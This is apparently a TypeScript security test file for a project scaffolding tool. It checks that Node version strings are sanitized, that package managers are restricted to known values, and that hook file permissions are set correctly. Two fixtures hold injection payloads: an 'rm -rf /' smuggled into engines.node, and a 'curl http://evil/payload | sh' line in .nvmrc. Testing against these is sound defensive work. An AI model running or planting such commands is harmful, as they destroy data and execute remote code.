import fs from 'node:fs/promises';
import path from 'node:path';
import { withProject } from '@test/helpers/project.js';
import { withTempDir } from '@test/helpers/temp.js';
import { describe, expect } from 'vite-plus/test';

import {
  isExecutableFile,
  writeTaskDiffs,
} from '../../packages/tasks/src/factory/ops.js';

describe('security: profile value sanitization', () => {
  test('nodeVersion contains only digits from engines.node', async () => {
    await withProject(
      {
        'package.json': { engines: { node: '>=18.0.0' }, name: 'test' },
      },
      async ({ profile }) => {
        expect(profile.nodeVersion).toMatch(/^\d+$/);
      }
    );
  });

  test('nodeVersion extracts digits from malicious engines.node', async () => {
    await withProject(
      {
        'package.json': {
          engines: { node: "22'\n      run: rm -rf /\n      " },
          name: 'test',
        },
      },
      async ({ profile }) => {
        expect(profile.nodeVersion).toMatch(/^\d+$/);
        expect(profile.nodeVersion).not.toContain('\n');
        expect(profile.nodeVersion).not.toContain("'");
      }
    );
  });

  test('nodeVersion extracts digits from malicious .nvmrc', async () => {
    await withProject(
      {
        '.nvmrc': '22\nrun: curl http://evil/payload | sh\n',
        'package.json': { name: 'test' },
      },
      async ({ profile }) => {
        expect(profile.nodeVersion).toMatch(/^\d+$/);
        expect(profile.nodeVersion).not.toContain('\n');
      }
    );
  });

  test('packageManager is restricted to known values', async () => {
    await withProject(
      { 'package.json': { name: 'test' } },
      async ({ profile }) => {
        expect(['pnpm', 'npm', 'yarn', 'bun']).toContain(
          profile.packageManager
        );
      }
    );
  });
});

describe('security: husky hook file permissions', () => {
  test('isExecutableFile detects hook files', async () => {
    expect(isExecutableFile('.husky/commit-msg')).toBe(true);
    expect(isExecutableFile('.husky/pre-commit')).toBe(true);
    expect(isExecutableFile('.vite-hooks/pre-push')).toBe(true);
    expect(isExecutableFile('package.json')).toBe(false);
    expect(isExecutableFile('src/index.ts')).toBe(false);
  });

  test('writeTaskDiffs creates hook files as executable', async () => {
    await withTempDir('xtarterize-', async (tmpDir) => {
      await writeTaskDiffs(tmpDir, [
        {
          after: '#!/bin/sh\npnpm lint\n',
          before: null,
          filepath: '.husky/pre-commit',
        },
      ]);

      const stat = await fs.stat(path.join(tmpDir, '.husky', 'pre-commit'));
      const isExecutable = (stat.mode & 0o111) !== 0;
      expect(isExecutable).toBe(true);
    });
  });

  test('writeTaskDiffs creates regular files as non-executable', async () => {
    await withTempDir('xtarterize-', async (tmpDir) => {
      await writeTaskDiffs(tmpDir, [
        {
          after: 'root = true\n',
          before: null,
          filepath: '.editorconfig',
        },
      ]);

      const stat = await fs.stat(path.join(tmpDir, '.editorconfig'));
      const isExecutable = (stat.mode & 0o111) !== 0;
      expect(isExecutable).toBe(false);
    });
  });
});
